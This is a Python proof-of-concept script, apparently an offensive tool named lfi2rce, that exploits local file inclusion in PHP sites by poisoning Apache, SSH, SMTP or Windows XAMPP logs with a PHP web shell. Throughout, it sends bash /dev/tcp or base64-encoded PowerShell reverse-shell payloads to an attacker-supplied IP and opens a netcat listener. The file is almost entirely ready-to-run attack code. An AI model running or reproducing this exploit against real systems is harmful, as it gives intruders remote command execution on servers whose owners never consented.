#!/usr/bin/python3

#################
# lfi2rce poc   #
# by 0bfxgh0st* #
#################

import requests
import sys
import os
import time
from urllib.parse import urlparse
import base64

print ("lfi2rce ~by 0bfxgh0st*\n")

####################################################################
apache_file_to_poison='/var/log/apache2/access.log'                #
ssh_file_to_poison='/var/log/auth.log'                             #
smtp_file_to_poison='/var/log/mail.log'                            #
windows_apache_file_to_poison='C:/xampp/apache/logs/access.log'    #
target_ssh_port='22'                                               #
target_smtp_port='25'                                              #
####################################################################

def help():
	print ("Usage python3 lfi2rce.py <url> <poison type> <attacker ip> <attacker port>\n")
	print ("Poison type options:\n")
	print ("          apache             apache2 log poison")
	print ("          ssh                ssh log poison")
	print ("          smtp               smtp log poison")
	print ("          windows            windows apache log poison\n")
	print ("Examples:\n")
	print ('          python3 lfi2rce.py "http://ghost.server/index.php?file=" apache 10.0.2.15 1337')
	print ('          python3 lfi2rce.py "http://ghost.server/index.php?page=" ssh 10.0.2.15 1337')
	print ('          python3 lfi2rce.py "http://ghost.server/index.php?search=" smtp 10.0.2.15 1337')
	print ('          python3 lfi2rce.py "http://ghost.winserver/index.php?s=" windows 10.0.2.15 1337')

try:
	url = sys.argv[1]
	log_poison_type = sys.argv[2]
	attacker_ip = sys.argv[3]
	attacker_port = sys.argv[4]
	target_host = urlparse(url).netloc

except IndexError:

	help()
	sys.exit(1)

def linux_apache_log_poison():

	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'      # m30w's with @GatoGamer1155
	# injection via user agent
	print ("Poison " + apache_file_to_poison + "\n")
	headers = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
	requests.get(url + apache_file_to_poison, headers=headers)
	# sleeping for 4 seconds, waiting until log file writes new entry (avoiding recently cleaned log)
	time.sleep(4)
	print ("\n\n[\033[32m+\033[0m] Sending payload\n")
	os.system('curl -s ' + '"' + url + apache_file_to_poison + '&cmd=' + payload + '"' + " &")
	os.system('nc -lvp ' + attacker_port)

def linux_ssh_log_poison():

	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
	# injection via ssh
	print ("Poison " + ssh_file_to_poison + "\n")
	inj ="ssh '<?php system($_GET[\"cmd\"]); ?>'@" + target_host + ' -p ' + target_ssh_port
	os.system(inj)
	time.sleep(3)
	print ("\n[\033[32m+\033[0m] Sending payload\n")
	os.system('curl -s ' + '"' + url + ssh_file_to_poison + '&cmd=' + payload + '"' + " &")
	os.system('nc -lvp ' + attacker_port)

def linux_smtp_log_poison():

	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
	print ("Poison " + smtp_file_to_poison + "\n")
	# injection via telnet
	os.system("{ printf \"MAIL FROM:<unknow@mail.com>\n\"; sleep 1; printf \"RCPT TO:<?php system(\$_GET['cmd']); ?>\n\"; sleep 1; } | telnet " + target_host + " " + target_smtp_port)
	time.sleep(3)
	print ("\n[\033[32m+\033[0m] Sending payload\n")
	os.system('curl -s ' + '"' + url + smtp_file_to_poison + '&cmd=' + payload + '"' + " &")
	os.system('nc -lvp ' + attacker_port)

def windows_apache_log_poison():

	print ("Bulding encoded payload")
	build_payload = ("$client = New-Object System.Net.Sockets.TCPClient('" + attacker_ip + "', " + attacker_port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();")
	bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
	base64payload = bytes_encoded.decode()
	time.sleep(3)
	payload = ('powershell.exe%20-ExecutionPolicy%20Bypass%20-e%20' + base64payload)
	print ("Poison " + windows_apache_file_to_poison)
	headers = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
	requests.get(url + windows_apache_file_to_poison, headers=headers)
	time.sleep(4)
	os.system('curl ' + '"' + url + windows_apache_file_to_poison + '&cmd=' + payload + '"' + " &")
	os.system('nc -lvp ' + attacker_port)

if log_poison_type == 'apache':
	linux_apache_log_poison()
if log_poison_type == 'ssh':
	linux_ssh_log_poison()
if log_poison_type == 'smtp':
	linux_smtp_log_poison()
if log_poison_type == 'windows':
	windows_apache_log_poison()
else:
	print("\033[1;31mSomething went wrong\033[0m")
